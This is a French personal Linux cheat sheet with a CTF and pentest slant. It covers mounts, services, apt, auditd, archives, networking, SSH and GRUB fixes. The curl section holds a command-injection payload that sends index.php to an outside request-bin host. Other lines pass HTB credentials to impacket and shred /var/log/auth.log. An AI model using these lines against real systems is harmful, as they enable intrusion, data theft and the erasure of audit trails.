# Linux Basics

## Ressources

* [Cheat.sh](https://cheat.sh/)

## Authent Centralisée

| Techno | Description |
|----------|-------------|
| Kerberos | Protocole d'authentification réseau sécurisé |
| LDAP | Service d'annuaire pour stocker les informations d'utilisateurs |
| FreeIPA | Solution intégrée pour la gestion des identités et des politiques |
| SSSD | Daemon pour gérer l'accès aux services d'authentification distants |
| PAM et NSS | Modules d'authentification et de services de noms |


## Clavier

```shell
setxkbmap fr  #ne marche que lorsque X est lancé
loadkeys fr
```

## misc

```sh
apt install binutils net-tools -y
```

## environnement

```sh
env
cat .bashrc
alias
echo $HOME
```

## Disques, Volumes et Montages

| Montage | Options recommandées | Description |
|---------|---------|-------------|
| / | aucune | root |
| /boot | nosuid,nodev,noexec | Contient le noyau et le chargeur de démarrage. |
| /tmp | nosuid,nodev,noexec | fichiers temporaires |
| /home | nosuid,nodev,noexec | repertoires utilisateurs
| /dev | aucune | peripheriques |
| /var |  nosuid,nodev,noexec | variables et logs |

```sh
lsblk
findmnt
cat /etc/fstab
fdisk -l
findmnt
gparted
df
```

## services

```sh
systemctl list-units
systemctl status
systemctl disable ssh.service 
systemctl stop ssh.service 
```

## rpc et sockets

```sh
rpcinfo
lsof
ss
```

## trouver des fichiers / binaire

```sh
find / -name flag.txt
locate ls
which ls
```

## apt

### Lister les paquets

```sh
dpkg -l
```

### info sur un paquet

```sh
dpkg -l apparmor
```

### les depots

```sh
cat /etc/apt/sources.list
```

### Lister les clé gpg

```sh
apt-key list
apt-key --keyring /etc/apt/trusted.gpg finger
```

### debug Dependences

notament après l'installation de package (.deb) manuellement (`pdkg -i`)

```shell
apt --fix-broken install
apt-get install --fix-missing
apt-get install --fix-broken
```

## fichiers

| lettre | description |
|-----|-----|
| - | regular file | 
| b | block special file | 
| c | character special file | 
| C | high performance ("contiguous data") file  | 
| d | directory | 
| D | door (Solaris 2.5 and up) | 
| l | symbolic link | 
| M | off-line ("migrated") file (Cray DMF) | 
| n | network special file (HP-UX)  | 
| p | FIFO (named pipe) | 
| P | port (Solaris 10 and up) | 
| s | socket | 
| ? | some other file type | 


```shell
file executable.2772.exe 
objdump -d /usr/bin/sh
strings <executable ou l'on cherche des chaines de chars>
```

## integrité

```sh
sha256sum test
```

## hexa

### éditeur sous kali: 

* hexeditor
* bless

### mettre du code hexa dans un fichier binaire: 

```shell
xxd -r -p input.hex output.bin
```
### dumper un binaire en hexa: 

```shell
hexdump -C
```

### permission

```shell
id
whoami
```

#### permission POSIX

```sh
touch test
umask 0077
chmod 700 test
chmod +x test
```

### capabilities (rarement utilisé)

```sh
cat /proc/1/status | grep Cap
capsh --decode=0000000000003000
```

### Auditer les permissions

#### monitorer un repertoire:

```sh
apt install auditd
systemctl status auditd.service
auditctl -w /home/michael/Downloads/VulnerableLightApp/VulnerableWebApp/ -p xwa -k vulnapp
#auditctl -a always,exit -F dir=/home/michael/Downloads/VulnerableLightApp/VulnerableWebApp/ -F perm=wax
auditctl -l
ausearch -k vulnapp | aureport -f -i
```

### monitorer un user:

```sh
auditctl -a always,exit -S openat -F auid=1000 -k user1000
ausearch -k user1000 | aureport -f -i
```

## Nvidia GPU Hashact

```shell
apt install -y ocl-icd-libopencl1 nvidia-driver nvidia-cuda-toolkit
hashcat -I
```

## file explorer Linux

Ouvrir l'explorateur de fichier: `xdg-open`

## runlevel Linux

### runlevel 3 au grub:

ajouter 3 apres “quiet” dans le GRUB


## Archives

### Compress file
```shell
zip compressed.zip file_name.txt
```
### Compress Folder

```shell
zip -r compressed.zip folder_name/
```

### Uncompress zipped file to current directory

```shell
unzip compressed.zip
```

### Uncompress zipped to current directory to specific location

```shell
unzip compressed.zip -d ~/Documents
```

### Compress a file / folder

```shell
tar zcvf compressed.tar.gz folder_name
```

### Uncompress a tar file

```shell
tar zxvf compressed.tar.gz
```

### tout détarer:

```shell
for i in *.tar.gz; do tar -xzvf $i; done
```

## information kernel

`dmesg` 

grepper pour chercher une pour identifier une information particulière 

ex: /dev/sdb pour trouver sa clé usb 

## usb

Ne pas monter la clé ou faire un unmount

```sh
dd if=kali-linux-blablabla.iso of=/dev/sdb
dd if=kali-linux-2019.4-amd64.iso of=/dev/sdb bs=512k
```

ou avec `gnome-disks` (sudo apt install gnome-disk-utility)


## curl

### Post exemple:

```sh
curl -X POST -d name=value http://challenge01.CTF.exemple/web-serveur/ch53/index.php
curl http://admin.academy.htb:31817/admin/admin.php -X POST -d 'id=73' -H 'Content-Type: application/x-www-form-urlencoded'
```

### requestbin exemple:

```sh
curl -d '{ "name": "Princess Leia" }' \
  -H "Content-Type: application/json" \
  https://enirdd6d0146.x.pipedream.net/
```

### upload data:

```sh
 curl -d "@data.txt" -X POST http://localhost:3000/data
 exemple avec injection de commande:
 curl -X POST -d 'ip=127.0.0.1%0acurl -X POST -d @index.php https://enzuva1p723tj.x.pipedream.net' http://challenge01.CTF.exemple/web-serveur/ch53/index.php
```
 
### Certificat non legitime

-k OU --insecure


## Effacement avec shred

```sh
shred test
find <dir> -type f -exec shred {} \; # suppression recursives
shred -f -n 10 /var/log/auth.log* # change les permissions (-f) et fait 10 passes (-n)
```

## cat in file

```shell
$ cat > MyFile
write the text in the console, when done press CTRL+D
Now, if you’ll open MyFile, you’ll se that it contains the text  you’ve entered. Be carefull as if the file you use is not empty, the  content will be erased before adding what you’re writting. 


cat <<EOF > print.sh
```

## Reseau

### IP

```sh
ip addr add 192.168.1.5/24 dev eth0
ifconfig eth0 192.168.1.5 netmask 255.255.255.0

ip link set eth0 [up|down]
ifconfig wlan0 down

route add default gw 192.168.1.254
```

### Wireless

`ifconfig` to see details of wireless interfaces
`iwconfig` to only see your wireless interfaces
`iwlist wlan0 scan` to see all the Wi-Fi APs in your area. (Will include key data about each AP)
`ncmli dev wifi` will do the same as above. (Key data)
`nmcli dev wifi connect AP-ESSID password APpassword` to connect to an AP

### routage

```shell
$ ip route show
Sample output:
192.168.2.0/24 dev eth1 proto kernel  scope link  src 192.168.2.1
192.168.1.0/24 dev eth0  proto kernel  scope link  src 192.168.1.2
default via 192.168.1.254 dev eth0You can add static route using following command:
ip route add {NETWORK} via {IP} dev {DEVICE}
For example network 192.168.55.0/24 available via 192.168.1.254:

$ ip route add 192.168.55.0/24 via 192.168.1.254 dev eth1

# Alternatively, you can use old good route command too:

$ route add -net 192.168.55.0 netmask 255.255.255.0 gw 192.168.1.254 dev eth1
```

## SSH

Ne pas garder les cléfs par défaut sur les serveur ssh des VM téléchargée

```sh
cd /etc/ssh/
mkdir default_kali_keys
mv ssh_host_* default_kali_keys/
 
dpkg-reconfigure openssh-server

md5sum ssh_host_*

cd default_kali_keys/
md5sum *

systemctl restart ssh
```

### ssh X11

pour du graphique activer le Forward X11 et

```txt
ForwardX11 yes
ForwardX11Trusted no
```

lancer `ssh -X` coté client


## smbclient

### sous xfce:

```sh
thunar smb://10.10.10.178/Data
```

###  impacket:

```sh
/usr/share/doc/python3-impacket/examples/smbclient.py C.Smith:xRxRxPANCAK3SxRxRx@10.10.10.178
```

## Logs

### logcheck

```sh
apt-get install logcheck
sudo -u logcheck logcheck -o
sudo -u logcheck logcheck -o > /data/$(date +"%m-%d-%Y-%T").log
```

## pbm de boot

### Option interessante à ajouter au GRUB (presser "e" au boot ou éditer)

"acpi=off" -> désactive énormément de choses dont la gestion de l'alim et acceleration materiel
"nouveau.blacklist=1" -> désactive les drivers nouveaux
"nomodeset" -> n'utilise pas les module graphique du kernel durant le boot jusqu'au chargement de X)

### Pbm d'écran / compatibilité nouveau /nvidia:

1. booter avec nomodeset ou nouveau.blacklist=1
2. installer le package nvidia-driver
3. rebooter (sans options supplémentaire, nouveau sera shooté automatiquement)

### pour les probleme de driver nvidia cf "Nvidia GPU"

si freeze: utiliser les tty (ctrl+alt+<1,2,3,4...>) ou démarrer sans interface graphique: cf "runlevel"


### modules

### To add or a module use :
`modprobe -a <module name>`

### To remove a module use :
`modprobe -r <module name>`